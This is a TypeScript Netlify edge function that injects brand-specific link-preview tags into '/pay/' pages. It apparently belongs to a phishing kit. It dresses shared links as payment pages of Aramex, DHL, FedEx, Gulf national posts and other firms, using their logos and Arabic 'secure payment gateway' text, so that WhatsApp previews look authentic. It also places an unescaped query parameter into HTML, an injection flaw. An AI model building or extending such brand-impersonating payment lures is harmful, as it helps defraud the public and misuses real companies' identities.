// Netlify Edge Function to inject Open Graph meta tags server-side
// This runs BEFORE JavaScript and ensures social media crawlers see correct OG tags

export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
  try {
    // Get the URL and query parameters
    const url = new URL(request.url);
    const path = url.pathname;
    
    // استخراج company من Path Parameters أولاً (دعم /p/:id/:company/:currency/:amount)
    const pathParts = path.split('/');
    let pathCompany = null;
    
    if (pathParts[1] === 'p' && pathParts.length >= 4) {
      pathCompany = pathParts[3]; // /p/id/company/...
    }
    
    // الأولوية: Path Parameters > Query Parameters
    const company = pathCompany || url.searchParams.get('company') || url.searchParams.get('c') || 'aramex';
    const title = url.searchParams.get('title');
    const currency = url.searchParams.get('currency');

    // Only process /pay/* and /p/* paths
    if (!path.startsWith('/pay/') && !path.startsWith('/p/')) {
      return context.next();
    }

    console.log('OG Injector: Processing', { path, company, title, currency });

    // Fetch the original HTML
    const response = await context.next();
    const html = await response.text();

    // GitHub CDN - موثوق 100% لحل مشكلة WhatsApp cache
    const githubCDN = 'https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public';

    // Company to OG image mapping (using GitHub CDN for reliability)
    const companyImages: Record<string, string> = {
      'aramex': `${githubCDN}/og-aramex.jpg`,
      'dhl': `${githubCDN}/og-dhl.jpg`,
      'dhlkw': `${githubCDN}/og-dhl.jpg`,
      'dhlqa': `${githubCDN}/og-dhl.jpg`,
      'dhlom': `${githubCDN}/og-dhl.jpg`,
      'dhlbh': `${githubCDN}/og-dhl.jpg`,
      'fedex': `${githubCDN}/og-fedex.jpg`,
      'ups': `${githubCDN}/og-ups.jpg`,
      'empost': `${githubCDN}/og-empost.jpg`,
      'smsa': `${githubCDN}/og-smsa.jpg`,
      'zajil': `${githubCDN}/og-zajil.jpg`,
      'naqel': `${githubCDN}/og-naqel.jpg`,
      'saudipost': `${githubCDN}/og-saudipost.jpg`,
      'kwpost': `${githubCDN}/og-kwpost.jpg`,
      'qpost': `${githubCDN}/og-qpost.jpg`,
      'omanpost': `${githubCDN}/og-omanpost.jpg`,
      'bahpost': `${githubCDN}/og-bahpost.jpg`,
      'jinakum': `${githubCDN}/og-jinakum.jpg`,
      'jinaken': `${githubCDN}/og-jinaken.jpg`,
      'albaraka': `${githubCDN}/og-albaraka.jpg`,
      'alfuttaim': `${githubCDN}/og-alfuttaim.jpg`,
      'alshaya': `${githubCDN}/og-alshaya.jpg`,
      'shipco': `${githubCDN}/og-shipco.jpg`,
      'national': `${githubCDN}/og-bahri.jpg`,
      'bahri': `${githubCDN}/og-bahri.jpg`,
      'hellmann': `${githubCDN}/og-hellmann.jpg`,
      'dsv': `${githubCDN}/og-dsv.jpg`,
      'agility': `${githubCDN}/og-aramex.jpg`,
      'genacom': `${githubCDN}/og-genacom.jpg`
    };

    // Get OG image for the company, fallback to aramex
    const ogImage = companyImages[company.toLowerCase()] || `${githubCDN}/og-aramex.jpg`;

    // Company display names
    const companyNames: Record<string, string> = {
      'aramex': 'أرامكس',
      'dhl': 'دي إتش إل',
      'dhlkw': 'دي إتش إل الكويت',
      'dhlqa': 'دي إتش إل قطر',
      'dhlom': 'دي إتش إل عُمان',
      'dhlbh': 'دي إتش إل البحرين',
      'fedex': 'فيديكس',
      'ups': 'يو بي إس',
      'empost': 'البريد الإماراتي',
      'smsa': 'سمسا',
      'zajil': 'زاجل',
      'naqel': 'ناقل',
      'saudipost': 'البريد السعودي',
      'kwpost': 'البريد الكويتي',
      'qpost': 'البريد القطري',
      'omanpost': 'البريد العُماني',
      'bahpost': 'البريد البحريني',
      'jinakum': 'جينا كم',
      'jinaken': 'جينا كن',
      'albaraka': 'البركة',
      'alfuttaim': 'الفطيم',
      'alshaya': 'الشايع',
      'shipco': 'شيبكو',
      'national': 'الوطنية للشحن',
      'bahri': 'بحري',
      'hellmann': 'هيلمان',
      'dsv': 'دي إس في',
      'agility': 'أجيليتي',
      'genacom': 'جيناكوم'
    };

    const companyName = companyNames[company.toLowerCase()] || company;

    // Generate dynamic title and description
    const ogTitle = title || `${companyName} - إكمال الدفع`;
    const ogDescription = currency
      ? `إكمال دفع ${companyName} بـ ${currency} - بوابة دفع آمنة وموثوقة`
      : `إكمال دفع ${companyName} - بوابة دفع آمنة وموثوقة`;
    const ogUrl = url.href;

    // Generate OG meta tags
    const ogTags = `
    <!-- Open Graph / Facebook / WhatsApp - Server Injected -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content="${ogUrl}" />
    <meta property="og:title" content="${ogTitle}" />
    <meta property="og:description" content="${ogDescription}" />
    <meta property="og:image" content="${ogImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:alt" content="${companyName} Payment Gateway" />
    <meta property="og:site_name" content="Gulf Payment Gateway" />
    <meta property="og:locale" content="ar_AR" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${ogTitle}" />
    <meta name="twitter:description" content="${ogDescription}" />
    <meta name="twitter:image" content="${ogImage}" />
    <meta name="twitter:image:alt" content="${companyName} Payment Gateway" />
    `;

    // Remove existing OG tags (if any) and inject new ones
    // This regex removes existing OG and Twitter meta tags
    let modifiedHtml = html.replace(
      /<meta\s+(?:property|name)=["']\w*og:\w*["'][^>]*>\s*/gi,
      ''
    ).replace(
      /<meta\s+name=["']twitter:\w*["'][^>]*>\s*/gi,
      ''
    );

    // Inject new OG tags after <head> tag
    modifiedHtml = modifiedHtml.replace(
      /<head[^>]*>/i,
      (match) => `${match}\n${ogTags.trim()}`
    );

    console.log('OG Injector: Injected tags for', { company, currency, title: ogTitle, ogImage });

    // Return modified HTML with same headers
    return new Response(modifiedHtml, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN'
      }
    });

  } catch (error) {
    console.error('OG Injector Error:', error);
    // If anything goes wrong, fall back to original response
    return context.next();
  }
}
